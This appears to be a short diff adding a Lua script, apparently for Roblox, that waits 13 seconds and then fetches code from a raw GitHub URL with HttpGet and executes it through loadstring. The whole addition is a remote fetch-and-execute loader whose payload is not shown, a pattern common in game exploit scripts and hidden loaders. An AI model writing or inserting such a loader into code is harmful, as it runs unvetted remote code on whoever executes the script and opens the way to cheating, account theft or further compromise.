@@ -1,0 +1,3 @@
+wait(13)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/yieviro92creepy/Jjju/main/Hzhz'))()
